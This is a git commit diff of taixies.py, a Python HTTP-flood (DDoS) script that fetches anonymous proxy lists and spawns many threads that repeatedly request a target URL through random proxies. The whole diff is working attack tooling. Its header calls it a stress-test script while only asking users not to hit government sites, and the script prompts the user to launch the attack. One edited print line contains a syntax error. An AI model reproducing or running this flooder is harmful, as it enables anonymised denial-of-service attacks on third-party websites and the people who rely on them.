419a3afef5fbbffd1560fed4bc221dde9d5d6edf
GogoZin <47559665+GogoZin@users.noreply.github.com>
2019-08-10 19:24:20 +0800

    Update taixies.py

--- taixies.py
+++ taixies.py
@@ -1,8 +1,14 @@
+###########################################
+#	This Script Is Code By GogoZin    #
+#	Can Use In Stress Test            #
+#	But Don't Attack Any Gov Site     #
+#	If Want Me To Keep Update         #
+###########################################
 import requests
 import sys
 import time
 import random
-from threading import Thread
+import threading
 from colorama import Fore
 
 print(Fore.GREEN + """MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
@@ -31,6 +37,13 @@ print(Fore.CYAN + "          \\\\Proxy Version//")
 print(Fore.CYAN + "       Code By GogoZin. -2019/8/2")
 print(Fore.RED + "##Update Add Https And Anonymous Proxies##")
 
+def opth():
+	for i in range(thr):
+		x = threading.Thread(target=atk)
+		x.start()
+		print("Threads " + str(i+1)+ " Created ")
+		time.sleep(0.01)
+	print("Wait A Few Seconds For Threads Ready To Attack ...")
 
 def main():
 	global pprr
@@ -44,12 +57,12 @@ def main():
 	cho = str(input(Fore.YELLOW + "Get Some Fresh Proxies ? (y/n) : " + Fore.WHITE))
 	if cho =='y':
 		if po =='80':
-			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all&anonymity=all&ssl=no&timeout=1000')
+			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1000&country=all&ssl=all&anonymity=all') # Code By GogoZin
 			with open("proxies.txt","wb") as fp:
 				fp.write(rsp.content)
 				print(Fore.CYAN + "Sucess Download Proxies List !")
 		else:
-			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&country=all&anonymity=elite&ssl=yes&timeout=1000')
+			rsp = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1000&country=all&ssl=yes&anonymity=all') # Code By GogoZin
 			with open("proxies.txt","wb") as fp:
 				fp.write(rsp.content)
 				print(Fore.CYAN + "Sucess Download Https Proxies List !")
@@ -57,25 +70,25 @@ def main():
 		pass
 	list = str(input(Fore.YELLOW + "Proxies List (proxies.txt): " + Fore.WHITE))
 	pow = int(input(Fore.YELLOW + "CC.Power (1-100) :" + Fore.WHITE))
-	for x in range(thr):
-		x = Thread(target=atk, name=(x))
-		time.sleep(0.01)
-		x.start()
-	print("Wait A Few Seconds For Threads Ready To Attack . . .")
-	time.sleep(3)
-	input("Press Enter To Launch Attack !")
+	opth()
 	
 def atk():
+	pprr = open(list).readlines()
+	proxy = random.choice(pprr).strip().split(":")
+	s = requests.session()
+	s.proxies = {}
+	s.proxies['http'] = ("http://"+str(proxy[0])+":"+str(proxy[1]))
+	s.proxies['https'] = ("http://"+str(proxy[0])+":"+str(proxy[1]))
+	time.sleep(10)
 	while True:
-		pprr = open(list).readlines()
-		proxy = random.choice(pprr).strip().split(":")
-		s = requests.session()
-		s.proxies = {}
-		s.proxies['http'] = ("http://"+str(proxy[0])+":"+str(proxy[1]))
-		s.proxies['https'] = ("http://"+str(proxy[0])+":"+str(proxy[1]))
 		try:
 			s.get(url)
-			print(Fore.GREEN + "From ~ / " + Fore.WHITE + str(proxy[0])+":"+str(proxy[1]) + Fore.GREEN + " Target-> " + Fore.WHITE + str(url))
+			print(Fore.GREEN + "From ~ [ " + Fore.WHITE + str(proxy[0])+":"+str(proxy[1]) + Fore.GREEN + " ] "Fore.GREEN + " Target-> " + Fore.WHITE + str(url)) #Code By GogoZin
+			try:
+				for y in range(pow):
+					s.get(url)
+			except:
+				s.close()
 		except:
 			s.close()
 			print(Fore.RED + "[!]Couldn't Connect To Proxy" + Fore.WHITE)
